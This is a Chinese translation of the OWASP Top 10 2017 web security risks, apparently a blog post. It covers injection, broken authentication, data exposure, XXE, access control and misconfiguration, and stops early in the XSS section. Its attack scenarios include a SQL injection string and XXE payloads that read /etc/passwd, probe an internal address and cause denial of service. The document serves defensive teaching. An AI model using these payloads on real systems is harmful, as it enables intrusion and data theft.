---

title: OWASP 2017 Web 应用程序十大安全风险（译）

date: 2017-12-11 22:01:18

desc: OWASP 安全 漏洞 Web 2017 Top10

---

原文地址：[OWASP Top 10 Application Security Risks - 2017](https://www.owasp.org/index.php/Top_10_2017-Top_10)

OWASP 发布 Web 应用程序十大安全风险，至今为止应该有三次更新：2010年 / 2013年 / 2017年。

正好工作上在讨论 2013 年的版本，此篇文章用来翻译 2017 年的版本。

深入了解这排名前十的 Web 应用安全风险。

<!--more-->

## Top 10 应用安全风险列表

- [A1-注入-Injection](#A1-注入-Injection)
- [A2-失效的身份认证-Broken-Authentication](#A2-失效的身份认证-Broken-Authentication)
- [A3-敏感数据泄露-Sensitive-Data-Exposure](#A3-敏感数据泄露-Sensitive-Data-Exposure)
- [A4-XML-外部实体-External-Entities-(XXE)](#A4-XML-外部实体-External-Entities)
- [A5-失效的访问控制-Broken-Access-Control](#A5-失效的访问控制-Broken-Access-Control)
- [A6-安全配置错误-Security-Misconfiguration](#A6-安全配置错误-Security-Misconfiguration)
- [A7-跨站脚本-Cross-Site-Scripting-(XSS)](#A7-跨站脚本-Cross-Site-Scripting)
- [A8-不安全的反序列化-Insecure-Deserialization](#A8-不安全的反序列化-Insecure-Deserialization)
- [A9-使用含有已知漏洞的组件-Using-Components-with-Known-Vulnerabilities](#A9-使用含有已知漏洞的组件-Using-Components-with-Known-Vulnerabilities)
- [A10-不足的日志记录和监控-Insufficient_Logging&Monitoring](#A10-不足的日志记录和监控-Insufficient_Logging&Monitoring)

## A1-注入-Injection

> 注入缺陷，例如 SQL，NoSQL，OS 和 LDAP 注入，一般指不受信任的数据被伪装成命令或者查询语句的一部分，发送至解析器后发生了执行的过程。攻击者的恶意数据能够欺骗解释器在未被授权的情况下执行非预期代码或者访问数据。

#### 威胁来源、弱点以及影响

几乎任何数据来源都可能成为注入攻击的媒介，包括环境变量，参数，外部以及内部的 Web 服务，以及用户的类型。当攻击者可以向解释器发送恶意数据时，注入漏洞就产生了。

注入漏洞十分盛行，特别是在历史遗留的代码中。注入缺陷通常出现在 SQL，LDAP，XPath 或者 NoSQL 查询语句，OS 命令，XML 解析器，SMTP 头部，表达式语言，以及 ORM 查询语句中。注入漏洞很容易被代码审查发现。扫描器和模糊搜索可以帮助攻击者找到这些注入漏洞。

注入可能会导致数据丢失、破坏以及公开给未授权的群组，责任缺失以及拒绝授权。注入有些时候会导致主机被彻底地接管。为避免业务受到影响，应该重视应用与数据的保护。

#### 你的应用是脆弱的吗？

一个应用是脆弱的如果它：

- 对用户来源的数据不进行验证，过滤或者净化。
- 动态查询或者非参数的调用，在没有上下文感知转义的情况下，被用于解释器。
- 恶意数据被直接赋给 ORM 查询参数，用于获取敏感或者未授权的数据。
- 恶意数据被直接使用或者连接，例如 SQL 或者 命令在动态查询语句、命令或者存储过程中包含结构和恶意数据。

#### 攻击案例场景

**例子一**：一个应用将不可信的数据用于 SQL 查询语句结构中：

```sql
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

**例子二**：类似的，应用盲目地信任框架工具，仍然可能导致查询语句的漏洞：

```sql
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

在这两个例子中，攻击者在他们的浏览器中修改 `id` 参数的值变成 ` or '1' = '1'` ，例如：

```
http://example.com/app/accountView?id=' or '1'='1
```

这样变动意味着这两个查询语句均会返回用户表中的所有记录。更多危险的攻击可能篡改或者删除数据，甚至存储过程被调用。

#### 如何防御

防御注入攻击需要保持数据与命令语句、查询语句的分隔开来。

- 最好的选择是使用安全的 API，完全避免使用解释器，或者提供一个参数界面的接口，或者迁移到 ORM 或者实体框架。
- 使用正确的或者*白名单*服务器端的输入验证，均有助于防止注入攻击。但这不是一种彻底的防御方式，因为很多应用程序都需要特殊的字符，比如文本区域或者移动端的 API 设计。
- 对于那些历史残留的动态查询，可以使用这个解释器的特殊字符转义语法来处理。
- 查询语句中使用 LIMIT 和其他 SQL 的控件，来阻止 SQL 注入时大量地泄露记录。

#### 参考资料

**OWASP**

- [OWASP Proactive Controls: Parameterize Queries](https://www.owasp.org/index.php/OWASP_Proactive_Controls#2:_Parameterize_Queries)
- [OWASP ASVS: V5 Input Validation and Encoding](https://www.owasp.org/index.php/ASVS_V5_Input_validation_and_output_encoding)
- [OWASP Testing Guide: SQL Injection](https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29), [Command Injection](https://www.owasp.org/index.php/Testing_for_Command_Injection_%28OTG-INPVAL-013%29), [ORM injection](https://www.owasp.org/index.php/Testing_for_ORM_Injection_%28OTG-INPVAL-007%29)
- [OWASP Cheat Sheet: Injection Prevention](https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet)
- [OWASP Cheat Sheet: SQL Injection Prevention](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)
- [OWASP Cheat Sheet: Injection Prevention in Java](https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet_in_Java)
- [OWASP Cheat Sheet: Query Parameterization](https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet)
- [OWASP Automated Threats to Web Applications – OAT-014](https://www.owasp.org/index.php/OWASP_Automated_Threats_to_Web_Applications)

**外部资料**

- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-564: Hibernate Injection](https://cwe.mitre.org/data/definitions/564.html)
- [CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)
- [PortSwigger: Server-side template injection](https://portswigger.net/kb/issues/00101080_serversidetemplateinjection)

## A2-失效的身份认证-Broken-Authentication

> 应用程序错误地使用身份认证以及会话管理，令攻击者能够破译密码，密匙，会话凭证或者其他可能的开发缺陷暂时性或者永久的伪装成用户的身份。

#### 威胁来源、弱点以及影响

攻击者可以获得数百万计合理的用户名和密码组合，例如默认的管理员账号列表，自动化的暴力破解，以及词典攻击工具。会话管理攻击比较容易理解，尤其是没有过期的会话凭证。

大多数的失效身份认证设计和实现，普遍存在身份认证失效问题。会话管理是认证以及访问控制的基础，并且存在于所有有状态管理的应用中。攻击者可以通过指南字典来检测到失效的身份认证，但是通常更关注密码转储自动化工具、字典攻击来发现失效的身份认证。

攻击者只需要少数的账号或者一个管理员账号就可以破坏我们的系统。根据应用领域的不同，这可能会导致资金流失，社会安全欺诈以及用户身份盗用，受法律保护的敏感信息泄露。

#### 你的应用是脆弱的吗？

确认用户身份，认证信息和会话管理对免于认证相关的攻击是非常有必要的。如果你的应用有以下这些问题，那它可能是脆弱的：

- 允许[凭证填充](https://www.owasp.org/index.php/Credential_stuffing)，攻击者可能会获取到有效的用户名和密码的列表。
- 允许暴力破解或者其他自动化的攻击。
- 允许默认、脆弱或者常用的密码，比如 `Password1` 或者 `admin/admin`。
- 使用脆弱或者不起作用的认证恢复和忘记密码程序，比如 `基于已知的知识问答`，这是不安全的。
- 使用明文，加密或者单薄的哈希密码。
- 缺少或者失效的多重认证。
- 在 URL 中暴露会话 ID。
- 在成功登陆之后不更换会话 ID。
- 不适当的弃用会话 ID。用户注销或者退出之后，不适当的销毁会话或者认证凭证。

#### 攻击案例场景

**例子一**：[凭证填充](https://www.owasp.org/index.php/Credential_stuffing)，使用已知密码列表，是一种常见的攻击。如果一个应用没有防范自动化的攻击或者证书填充保护，则这个应用可以被当做一个密码验证器，来确定证书是否有效。

**例子二**：大多数认证攻击的发生都是由于使用密码作为唯一的凭证。过去一种经过思考的最佳实践是：最新的密码轮换和复杂度要求，鼓励用户使用复杂的密码。建议用户使用多因素的身份验证。

**例子三**：不合理的应用会话超时处理。一个用户使用公共的电脑登录了应用，他仅仅是关闭了浏览器而没有点击注销就离开了。攻击者可以在过后使用同样的浏览器，以认证的身份进入应用。

#### 如何防御

- 如果可能，实行多重因素的认证来避免自动化、凭证填充、暴力破解或者凭证被盗用等攻击。
- 不要传递或者部署任何默认证书或凭证，尤其是对于管理员账户。
- 实行弱密码检测，比如检查新密码或者修改过的密码是否属于 [top 10000 worst passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)。
- 将密码长度、复杂性以及循环规则设置为符合 [NIST 800-63 B's guidelines in section 5.1.1 for Memorized Secrets](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) 标准，或者与其他现代密码规则匹配。
- 确保注册、证书恢复、API 路径能够对所有输出结果使用相同的消息，来抵挡账户枚举攻击。
- 当用户登录失败时，应该限制或者减少频率。当遇到凭证填充，暴力破解或者其他攻击时，记录所有的失败尝试，然后通知管理员。
- 使用服务器端安全的内置认证，登陆成功后生成一个新的高度混淆的随机会话 ID。会话 ID 不应该放置在 URL 中，应该安全的保存并且在用户注销后销毁。

#### 参考资料

**OWASP**

- [OWASP Proactive Controls: Implement Identity and Authentication Controls](https://www.owasp.org/index.php/OWASP_Proactive_Controls#5:_Implement_Identity_and_Authentication_Controls)
- [OWASP Application Security Verification Standard: V2 Authentication](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab.3DHome)
- [OWASP Application Security Verification Standard: V3 Session Management](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab.3DHome)
- [OWASP Testing Guide: Identity](https://www.owasp.org/index.php/Testing_Identity_Management) and [Authentication](https://www.owasp.org/index.php/Testing_for_authentication)
- [OWASP Cheat Sheet: Authentication](https://www.owasp.org/index.php/Authentication_Cheat_Sheet)
- [OWASP Cheat Sheet: Credential Stuffing](https://www.owasp.org/index.php/Credential_Stuffing_Prevention_Cheat_Sheet)
- [OWASP Cheat Sheet: Forgot Password](https://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet)
- [OWASP Cheat Sheet: Session Management](https://www.owasp.org/index.php/Session_Management_Cheat_Sheet)
- [OWASP Automated Threats Handbook](https://www.owasp.org/index.php/OWASP_Automated_Threats_to_Web_Applications)

**External**

- [NIST 800-63b: 5.1.1 Memorized Secrets](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) - for thorough, modern, evidence-based advice on authentication.
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)


## A3-敏感数据泄露-Sensitive-Data-Exposure

> 许多 Web 应用和 API 接口不重视敏感数据的保护，比如资金数据、健康数据和个人身份数据。攻击者可能窃取或者修改这些不设防的数据，用作信用卡诈骗、身份盗用或者其他犯罪行为。未特别保护的敏感数据容易遭到破坏，这些数据包括传输中的数据、存储的数据以及浏览器中的交互数据。

#### 威胁来源、弱点以及影响

和密码的字典攻击不同，当数据传输或者从浏览器中，攻击者窃取密匙、执行中间人攻击、或者从服务器上偷取清晰的文本数据。这通常需要手动去攻击。早前检索的密码数据库可能通过 GPUs 暴力破解。

纵观最近几年，这是最常见的和最有影响力的攻击。最常见的漏洞竟然只是没有加密敏感数据。在数据加密中，常见问题是弱密匙的生成和管理，易破解的算法、协议和密码经常被使用，尤其是使用弱的密码哈希存储技术。服务器端去检测传输中的数据弱点很容易，但是检测存储数据的弱点却非常困难。

失败常常会波及本应受到保护的数据。一般来说，包含敏感个人信息数据的信息，例如健康记录、证书文件、个人信息以及信用卡信息，这些信息受到相关法律和条例的保护，例如 EU GDPR 或者当地法律法规。

#### 你的应用是脆弱的吗？

第一件事情是确认哪些数据需要在传输和存储过程中得到保护。例如：密码、信用卡号、健康记录、个人信息和商业秘密需要额外的保护，特别是那些受到法律的保护或者金融数据保护的敏感信息。对于以上这些数据：

* 是否有数据通过明文传递？需要注意的协议有 HTTP、SMTP 和 FTP。外部网络传输是特别危险的。对所有内部通信进行验证，例如：负载平衡器、Web 服务器或后端系统之间的通信。
* 是否有任何陈旧的或者脆弱的密码加密算法使用了默认配置或者过时的代码？
* 是否使用了默认的密匙，是否生成或者复用了脆弱的加密密匙，或者缺少恰当的密匙管理和轮换？
* 加密是否是强制执行？是否遗漏了用户客户端（浏览器）的安全配置或者头部信息？
* 客户端（APP，邮件客户端）是否验证了收到的服务器证书是否可用？

#### 攻击案例场景

**例子一**：应用在数据库中使用自动算法加密了信用卡数字。然而在取出数据时，又自动解密了数据，这就容许了 SQL 注入漏洞来获取明文状态的用户信用卡数字。

**例子二**：网站没有为所有的页面使用或者执行 TLS 加密，或者仅支持弱加密算法。攻击者监控网络传输数据（例如在一个不安全的网络环境中），将 HTTPS 降级为 HTTP 传输，然后拦截了请求数据，从而偷取用户的会话 cookie。攻击者重新使用这个 cookie，伪造用户会话，获取或者修改用户的私人数据。除此之外，攻击者还可以篡改所有传输数据，例如资金的接收方等等。

**例子三**：密码数据库使用了未加盐或者简单的哈希算法来存储所有人的密码。一个文件上传的漏洞可以使攻击者取出密码数据库的数据。所有未加盐的哈希算法均可以被通过彩虹表暴力破解的方式破解。而简单的或者快速哈希算法也可以被 GPU  的方式破解，即使它们被加盐加密过。

#### 如何防御

对一些需要加密的敏感数据，起码要做到以下几点：

* 应用对数据进行分类来进行数据的处理、存储或者传输。依照法律法规要求和商业需要，识别出哪些数据是敏感的。
* 按应用的分类进行控制。
* 只对必要的敏感信息进行存储。没必要的敏感数据应该尽快的销毁或者通过 PCI DSS 标记拦截。未存储的数据是不能被盗取的。
* 确保加密所有存储中的敏感数据。
* 确保及时更新和加强在使用中的标准算法、协议和密匙。使用恰当的密匙管理方法。
* 使用例如 TLS 的技术来加密所有传输中的数据，确保数据加密被强制执行。如使用 HTTP 严格安全传输协议 HSTS。
* 禁用包含敏感信息的响应缓存。
* 使用拥有强大算法和加盐哈希方法的框架来存储密码。例如 [Argon2](https://www.cryptolux.org/index.php/Argon2)，[scrypt](https://wikipedia.org/wiki/Scrypt)，[bcrypt](https://wikipedia.org/wiki/Bcrypt) 或者 [PBKDF2](https://wikipedia.org/wiki/PBKDF2)。
* 独立地验证配置文件和设置的有效性。

#### 参考资料

**OWASP**

- [OWASP Proactive Controls: Protect Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#7:_Protect_Data)
- [OWASP Application Security Verification Standard](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project): [V7](https://www.owasp.org/index.php/ASVS_V7_Cryptography), [9](https://www.owasp.org/index.php/ASVS_V9_Data_Protection), [10](https://www.owasp.org/index.php/ASVS_V10_Communications)
- [OWASP Cheat Sheet: Transport Layer Protection](https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet)
- [OWASP Cheat Sheet: User Privacy Protection](https://www.owasp.org/index.php/User_Privacy_Protection_Cheat_Sheet)
- [OWASP Cheat Sheet: Password](https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet) and [Cryptographic Storage](https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet)
- [OWASP Security Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project)
- [OWASP Cheat Sheet: HSTS](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet)
- [OWASP Testing Guide: Testing for weak cryptography](https://www.owasp.org/index.php/Testing_for_weak_Cryptography)

**External**

- [CWE-220: Exposure of sens. information through data queries](https://cwe.mitre.org/data/definitions/220.html)
- [CWE-310: Cryptographic Issues](https://cwe.mitre.org/data/definitions/310.html)
- [CWE-311: Missing Encryption](https://cwe.mitre.org/data/definitions/311.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)
- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- [CWE-326: Weak Encryption](https://cwe.mitre.org/data/definitions/326.html)
- [CWE-327: Broken/Risky Crypto](https://cwe.mitre.org/data/definitions/327.html)
- [CWE-359: Exposure of Private Information - Privacy Violation](https://cwe.mitre.org/data/definitions/359.html)


## A4-XML-外部实体-External-Entities

> 许多使用老旧或者脆弱配置的 XML 处理器依赖了外部的 XML 文档。攻击者可以利用外部实体窃取内部文件 URI  地址、分享的文件、监听内部端口扫描、暴露内部文件、执行远程代码、或者实施拒绝服务等攻击。

#### 威胁来源、弱点以及影响

如果攻击者能够上传 XML 或者在 XML 文档中添加恶意内容，通过易受攻击的代码、依赖以及集合，他们就能够攻击利用脆弱的 XML 处理器。

默认情况下，许多旧的 XML 处理器能够对外部实体、在处理过程中废弃或者被引用的 URI 进行规范。[SAST](https://www.owasp.org/index.php/Source_Code_Analysis_Tools) 工具能够察觉出依赖和配置所产生的问题。[DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) 工具需要额外的手动步骤来发现和解决上述问题。手动测试者们需要训练如何去测试 XXE，尽管在2017年 XXE 漏洞并不普遍。

这个漏洞可以被用于窃取数据、从服务器执行远程服务、扫描内部系统、拒绝服务（denial-of-service）攻击，以及执行其他的攻击。

#### 你的应用是脆弱的吗？

应用，尤其是基于 XML 的 web 服务或者下游集成，如果包含以下这些内容，那就很容易被攻击：

* 应用直接接收 XML 或者 XML 上传，尤其是不可信来源的资源，或者可以在 XML 文档中插入不可信数据，然后被传递给了 XML 处理器处理。
* 应用或者基于 SOAP 的 web 服务中的任何 XML 处理器都启用了 [文档类型定义(DTDs)](https://en.wikipedia.org/wiki/Document_type_definition)。由于处理程序的功能不同，使用 DTD 处理的具体机制也不同，更多的参考资料，比如[OWASP Cheat Sheet 'XXE Prevention'](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet)。
* 如果应用为了安全性或者单点登录的目的而使用了 SAML 做身份认证。SAML 使用了 XML 做身份断言，这是很危险的做法。
* 如果应用使用了低于 1.2 版本的 SOAP，一旦 XML 实体被传递到了 SOAP 框架中，这很容易遭受 XXE 攻击。
* 易受到 XXE 攻击意味着应用程序更容易遭受拒绝服务供给，包括 Billion Laughs 攻击。

#### 攻击案例场景

许多公开的 XXE 问题已经被发觉了，包括攻击嵌入式设备。XXE 攻击一般发生在许多意想不到的地方，包括深度嵌套依赖关系。最简单的一种方法就是上传一个恶意的 XML 文件，一旦被接受：

**例子一**：攻击者尝试获取服务器中的额外数据：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <foo>&xxe;</foo>
```

**例子二**：攻击者通过改变上面的 ENTITY 来进入服务器的私有网络：

```xml
<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
```

**例子三**：攻击者尝试通过包含一个潜在无休止的文件来进行拒绝服务攻击：

```xml
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
```

#### 如何防御

培训开发者对于识别和缓解 XXE 攻击是至关重要的。除此之外，阻止 XXE 攻击需要：

* 如果可能，使用低复杂度的数据格式，例如 JSON，并且避免敏感数据的串行化。
* 更新或者升级所有 XML 处理器、正在使用的资料库和潜在可用的系统。使用依赖检测。升级 SOAP 到 1.2版本或者更高。
* 在应用所有 XML 解析器中禁用 XML 外部实体以及 DTD 进程，参照 [OWASP Cheat Sheet 'XXE Prevention'](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet)。
* 实施积极的服务器端防御（白名单），在 XML 文档、头部或者节点中，对输入值进行验证、过滤和清理。
* 验证 XML 或者 XSL 文件上传功能是否使用 XSD 验证或其他类似验证方法。
* 虽然在许多集成环境中，手动代码 Review 是大型复杂应用的最佳选择，但是SAST 工具能够在代码层帮助预防 XXE 漏洞。

如果无法实现这些控制手段，请考虑使用虚拟修复程序、API 安全网关或者防火墙来检测、架空和防止 XXE 攻击。

#### 参考资料

**OWASP**

- [OWASP Application Security Verification Standard](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab.3DHome)
- [OWASP Testing Guide: Testing for XML Injection](https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29)
- [OWASP XXE Vulnerability](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing)
- [OWASP Cheat Sheet: XXE Prevention](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet)
- [OWASP Cheat Sheet: XML Security](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet)

**External**

- [CWE-611: Improper Restriction of XXE](https://cwe.mitre.org/data/definitions/611.html)
- [Billion Laughs Attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)
- [SAML Security XML External Entity Attack](https://secretsofappsecurity.blogspot.tw/2017/01/saml-security-xml-external-entity-attack.html)
- [Detecting and exploiting XXE in SAML Interfaces](https://web-in-security.blogspot.tw/2014/11/detecting-and-exploiting-xxe-in-saml.html)


## A5-失效的访问控制-Broken-Access-Control

> 通过认证限制用户被允许去做什么经常没有合理的执行。攻击者能够利用这些漏洞获取未授权的功能或者数据，比如获取用户的账号信息、浏览敏感文件、修改其他用户的信息、修改进入权限等等。

#### 威胁来源、弱点以及影响

利用访问控制是攻击者的核心技能。[SAST](https://www.owasp.org/index.php/Source_Code_Analysis_Tools) 和 [DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) 工具能够发现访问控制的缺失，但是不能验证其功能是否正常。访问控制可以通过手动的方式检测，或者在某些特定框架下通过自动化检测访问控制缺失。

访问控制漏洞一般是由缺乏自动检测机制，或者开发者没有完善有效的功能测试。访问控制通常不适合自动化的静态或者动态测试。手动测试是一种最好的方式来查明丢失或者失效的访问控制，包括 HTTP 方法、控制器、直接对象引用等等。

技术方面的影响是攻击者可以假装用户、管理员或者拥有特权函数的用户，或者创建、访问、更新或者删除任何记录。业务影响取决于应用和数据的保护需要性。

#### 你的应用时脆弱的吗？

访问控制强制实施策略，例如用户不能在预期权限之外执行操作。失败通常导致未被授权的信息泄露、修改或者破坏所有数据、或在用户权限之外执行业务功能。常见的访问控制脆弱点包括：

* 可以通过修改 URL、内部应用状态、HTML 页面来绕过访问控制检查，或者简单使用外部 API 攻击工具。
* 允许将主键被修改为另一个用户的记录，例如允许浏览或者编辑其他人的账号。
* 特权提升。未登录状态下伪装为一个用户，或者一个普通用户伪装成管理员。
* 篡改元数据，例如重放或者篡改 JWT 访问控制令牌，或者利用提升权限的 cookie 或隐藏字段。
* CORS 错误配置导致允许未授权的 API 访问。
  * 以未认证的用户身份去强制浏览需要认证的页面，或者普通身份去浏览特权网页。在 API 访问控制中没有对 POST\PUT\DELETE做访问控制。


#### 攻击案例场景

**例子一**：应用程序在一次访问用户账户信息的 SQL 请求中使用未经验证的数据：

```Sql
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );
```

攻击者简单的在浏览器中修改了 `acct` 参数，来发送他们想要的任何账户号码。如果没有正确的去验证，那么攻击者可以获取任何用户的账户信息。

```
http://example.com/app/accountInfo?acct=notmyacct
```

**例子二**：攻击者强制浏览器访问目标地址，那些需要管理员权限才能访问到的页面。

```
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```

如果一个未认证的用户可以访问到这些页面，就是一个漏洞。如果一个非管理员能够访问到管理页面，那这也是一个漏洞。

#### 如何防御

访问控制只有在受信服务器端代码或者没有服务器的 API 中生效，这样攻击者才不能修改访问控制检查或者元数据。

* 除公共资源以外，应该默认拒绝访问。
* 实行一次性的访问控制机制，在应用程序中重点利用他们，包括减少 CORS 的使用。
* 模块访问权限应该强制记录其所有权，而不是接受任何用户能够创建、读取、更新或者删除任何记录。
* 独特的应用程序业务限制需求应该由域模型来执行。
* 禁用 web 服务目录列表并且确保文件源文件（例如 `.git` ）和备份文件不出现在 web 根目录下。
* 记录访问控制中的失败记录，在适当的时候提醒管理员。
* 对 API 和控制器访问频率进行限制，来尽量减少自动化攻击工具带来的伤害。
* JWT 令牌应该在用户登出的时候被弃用。

开发者和测试人员应该包括功能访问控制单元以及集成测试。

#### 参考资料

**OWASP**

- [OWASP Proactive Controls: Access Controls](https://www.owasp.org/index.php/OWASP_Proactive_Controls#6:_Implement_Access_Controls)
- [OWASP Application Security Verification Standard: V4 Access Control](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab.3DHome)
- [OWASP Testing Guide: Authorization Testing](https://www.owasp.org/index.php/Testing_for_Authorization)
- [OWASP Cheat Sheet: Access Control](https://www.owasp.org/index.php/Access_Control_Cheat_Sheet)

**External**

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-284: Improper Access Control (Authorization)](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [PortSwigger: Exploiting CORS misconfiguration](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)


## A6-安全配置错误-Security-Misconfiguration

> 安全错误配置是最普遍常见的一种问题。这是一般是由于不安全的默认配置、不完全或临时的配置、开放的云存储、错误配置的 HTTP 头部以及多余的错误信息包含了敏感信息。不仅仅是需要所有的操作系统、框架、库和应用程序都要安全配置，而且必须及时的更新和补丁他们。

#### 威胁来源、弱点以及影响

攻击者们经常企图利用未修补的漏洞或者访问默认账户、未启用的页面、没有保护的文件和目录等等，来获取未授权的访问权限或者系统内部信息。

安全配置错误可能发生在应用程序的任何层面，包括网络服务、平台、Web 服务、应用服务、数据库、框架、客户代码以及预安装的虚拟机器、容器或存储中。自动扫描工具可以很容易发现配置错误，使用默认账户或者配置，不必须的服务、遗留的选项等等。

这样的漏洞频繁的给予攻击者未认证的权限去访问一些系统数据或者功能。偶尔，这些漏洞可能导致系统完全被攻破。业务受影响的程度取决于所保护的应用及数据的重要性。

#### 你的应用是脆弱的吗？

应用程序可能是脆弱的，如果你有以下这些问题：

* 在应用程序栈的各个部分都缺少对应的安全加强措施，或者在云服务中不恰当的权限配置。
* 非必需的功能被投入使用或者被安装，例如不必须的端口、服务、页面、账户或者特权。
* 默认账户以及密码仍然被使用，并且没有被修改。
* 错误处理显示堆栈追踪或者将其他拥有过多信息的错误提醒发送给用户。
* 对于升级过的系统，没有启用最新的安全功能或者没有被正确配置。
* 应用程序服务、应用框架（例如：`Struts/Spring/ASP.NET` ）、库、数据库等，没有将他们的安全设置配置为可靠的参数。
* 软件过时以及易受攻击的。见：[A9-使用含有已知漏洞的组件-Using-Components-with-Known-Vulnerabilities](#A9-使用含有已知漏洞的组件-Using-Components-with-Known-Vulnerabilities)

#### 攻击案例场景

**例子一**：应用服务附带了未从服务中移除的应用程序样例。这些样例应用程序具有已知的安全漏洞，攻击者利用这些漏洞来攻击服务器。如果其中一个是管理员控制台，并且默认账户没有被更改，攻击者可以通过默认密码登录以及劫持服务。

**例子二**：服务器没有禁用目录列表。攻击者发现他们可以简单的列出所有目录。攻击者发现并且下载所有已编译的 JAVA 类，然后反编译来查看代码。攻击者进而可以发现应用程序中的安全访问控制漏洞。

**例子三**：应用程序服务器端的配置允许把详细的错误信息（例如堆栈跟踪）返回给用户。这可能会暴露敏感信息或者潜在的漏洞，例如已知含有漏洞组件的版本信息。

**例子四**：云服务器向其他 CSP 用户提供默认打开的网络分享权限。这允许了可访问到的云存储中敏感信息被盗用。

#### 如何防御

应该实施安全的安装过程，包括：

* 拥有一个可重复使用并且可靠的程序，可以快速并且简单的部署另一个安全的运行环境。开发、测试以及生产环境应该都被独立配置，在不同的环境中使用不同的密匙。这个程序应该是自动化的，最大限度的减少安装一个新的安全环境的消耗。
* 最小化的平台，没有任何不必须的功能、组件、文档以及示例。移除或者从不安装不使用的功能或者框架。
* 将审查和升级配置合理的记录到所有的安全提醒中，将升级和修补作为运维管理的一部分。还应特别注意云存储权限。
* 一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。
* 向客户端发送安全指令，例如：[Security Headers](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project) 。
* 设置一个自动化的程序去验证所有环境中配置文件和设置的有效性。

#### 参考资料

**OWASP**

- [OWASP Testing Guide: Configuration Management](https://www.owasp.org/index.php/Testing_for_configuration_management)
- [OWASP Testing Guide: Testing for Error Codes](https://www.owasp.org/index.php/Testing_for_Error_Code_%28OWASP-IG-006%29)
- [OWASP Security Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project)

For additional requirements in this area, see the Application Security Verification Standard [V19 Configuration](https://www.owasp.org/index.php/ASVS_V19_Configuration).

**External**

- [NIST Guide to General Server Hardening](https://csrc.nist.gov/publications/detail/sp/800-123/final)
- [CWE-2: Environmental Security Flaws](https://cwe.mitre.org/data/definitions/2.html)
- [CWE-16: Configuration](https://cwe.mitre.org/data/definitions/16.html)
- [CWE-388: Error Handling](https://cwe.mitre.org/data/definitions/388.html)
- [CIS Security Configuration Guides/Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [Amazon S3 Bucket Discovery and Enumeration](https://blog.websecurify.com/2017/10/aws-s3-bucket-discovery.html)

## A7-跨站脚本-Cross-Site-Scripting

> 当在新的页面打开应用程序，如果包含了没有经过适当的验证或编码的不可信数据，或者使用可以创建 HTML 或 JavaScript 的浏览器 API 更新现有的网页时，就可能会发生跨站脚本攻击。 XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或者将用户重定向至恶意站点。

#### 威胁来源、弱点以及影响

自动化工具能够发现和利用这三种 XSS 类型，并且存在方便攻击者利用漏洞的框架。

XSS 是 Top 10 中排名第二的最流行的漏洞，而且可以在三分之二的应用中发现。自动化工具能够自动找出一些 XSS 问题，尤其是成熟的技术中，例如 PHP / J2EE / JSP 和 ASP.NET。

